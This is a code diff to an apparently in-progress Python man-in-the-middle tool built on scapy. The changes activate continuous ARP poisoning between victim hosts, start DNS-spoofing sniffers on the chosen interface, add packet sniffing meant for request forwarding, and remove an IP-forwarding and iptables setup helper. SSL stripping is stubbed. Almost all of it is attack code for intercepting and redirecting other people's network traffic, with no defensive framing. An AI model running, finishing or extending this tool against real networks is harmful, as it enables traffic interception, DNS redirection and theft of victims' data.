@@ -2,7 +2,8 @@ import sys
 import re
 from subprocess import Popen, PIPE
 # from scapy.all import *
-from scapy.arch import get_if_list
+from scapy.arch import get_if_list, get_if_addr, get_if_hwaddr
+from scapy.config import conf
 from scapy.layers.dns import DNS, DNSRR, DNSQR
 from scapy.layers.inet import IP, UDP
 from scapy.layers.inet6 import IPv6
@@ -45,15 +46,16 @@ class MitMAttack:
         for target in self.targets:
             target['mac'] = getmacbyip(target['ip'])
 
-        self.dns_spoofing_targets = [targets[i] for i in args.dns_spoof] if args.dns_spoof else []
-        self.ssl_strip_targets = [targets[i] for i in args.ssl_strip] if args.ssl_strip else []
+        self.dns_spoofing_targets = [self.targets[i] for i in args.dns_spoof] if args.dns_spoof else []
+        self.ssl_strip_targets = [self.targets[i] for i in args.ssl_strip] if args.ssl_strip else []
 
-        self.host_ip = ''
-        self.host_mac = ''
+        self.host_ip = get_if_addr(self.network_interface)
+        self.host_mac = get_if_hwaddr(self.network_interface)
+        print(type(self.host_mac), type(self.host_ip))
+        print('Working on host: %s, %s, %s' % (self.network_interface, self.host_mac, self.host_ip))
 
         # execute attack
-        print('Starting mitm attack')
-        # self.main()
+        self.main()
 
     @staticmethod
     def ask_network_interface():
@@ -65,7 +67,21 @@ class MitMAttack:
         print(interfaces)
         for i, iface in enumerate(interfaces):
             print(str(i) + ": " + str(iface))
-        choice = int(input("\n Number: "))
+
+        no_answer = True
+        choice = 0
+        while no_answer:
+            try:
+                choice = input("\n Number: ")
+                if choice == 'q':
+                    exit(-1)
+                choice = int(choice)
+            except ValueError:
+                continue
+
+            if 0 <= choice < len(interfaces):
+                no_answer = False
+
         return interfaces[choice]
 
     def main(self):
@@ -73,23 +89,24 @@ class MitMAttack:
         Setup continuous arp poisoning and redirect packets between victims via this host
         :return:
         """
+        print('Starting mitm attack')
+        print('-' * 20)
+
         # start arp poisoning
         if self.arguments.arp_poison:
             th = threading.Thread(target=self.arp_poison_targets, args=(self.targets,), kwargs={'sleep': 60})
             th.start()
-            # arp_poison_targets(victims, sleep=60)
             print('Started, arp poisoning')
-            self.request_forwarding()
+            self.start_request_forwarding()
 
         # start dns spoofing
         self.dns_sniffer()
+        print('Setup dns spoofing')
 
         # start ssl strip
 
+        print('-' * 20)
         print('Attack is running')
-
-    def get_local_ip(self):
-        pass
 
     def arp_poison_targets(self, victims, sleep=0):
         """
@@ -100,7 +117,7 @@ class MitMAttack:
         """
         assert len(victims) >= 2, 'We must have at least 2 victims to poison'
         while True:
-            print('Poisoning targets')
+            # print('Poisoning targets')
             for i in range(len(victims) - 1):
                 for j in range(i + 1, len(victims)):
                     # arp poison both ways
@@ -124,14 +141,26 @@ class MitMAttack:
                                            pdst=target['ip'])
         sendp(p, iface='enp0s3', verbose=False)
 
-    def request_forwarding(self):
+    def start_request_forwarding(self):
         """
         Setup request forwarding of the targets
         :return:
         """
         # get packets sends to use but for another ip
-        AsyncSniffer(filter='ip and not ip dst %s and ether dst %s' % (self.host_ip, self.host_mac),
-                     prn=self.get_request_forwarding())
+        filter_requests = 'ether proto ip and not dst host %s and ether dst %s' % (self.host_ip, self.host_mac)
+        # filter_requests = 'not dst host %s' % (self.host_ip, )
+        filter_requests = 'ether dst %s' % (self.host_mac, )
+
+        filter_requests = str(filter_requests)
+        print(type(filter_requests))
+        print(filter_requests)
+        t = AsyncSniffer(filter=filter_requests, prn=lambda x: x.summary(), iface=self.network_interface)
+
+        # t = AsyncSniffer(filter=filter_requests, prn=self.get_request_forwarding(), iface=self.network_interface)
+        t.start()
+        # t.stop()
+        # t = AsyncSniffer(prn=lambda x: x.summary(), iface=self.network_interface)
+        # t.start()
 
     def get_request_forwarding(self):
         def forward_request(p):
@@ -157,8 +186,8 @@ class MitMAttack:
         This function is responsible for sniffing for DNS packets and forwarding them to the spoofer.
         :return:
         """
-
-        AsyncSniffer(filter=self.dns_filter, prn=self.get_dns_spoofer())
+        t = AsyncSniffer(filter=self.dns_filter, prn=self.get_dns_spoofer(), iface=self.network_interface)
+        t.start()
 
     def get_dns_spoofer(self):
         def dns_spoofer(p):
@@ -212,25 +241,6 @@ class MitMAttack:
                 print("Resolved DNS request for " + p[DNS].qd.qname + " by " + self.arguments.dns_ip)
 
         return dns_spoofer
-
-    @staticmethod
-    def set_local_settings():
-        """
-        Set local settings of the system to stop forwading ip messages
-        :return:
-        """
-        # Check to see if we are on linux
-        if platform.system() == "Linux":
-            # Enable IP forwarding
-            ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
-            ipf_read = ipf.read()
-            if ipf_read != '1\n':
-                ipf.write('1\n')
-            ipf.close()
-
-            # Disable DNS Query forwarding
-            firewall = "iptables -A FORWARD -p UDP --dport 53 -j DROP"
-            Popen([firewall], shell=True, stdout=PIPE)
 
 
 if __name__ == '__main__':
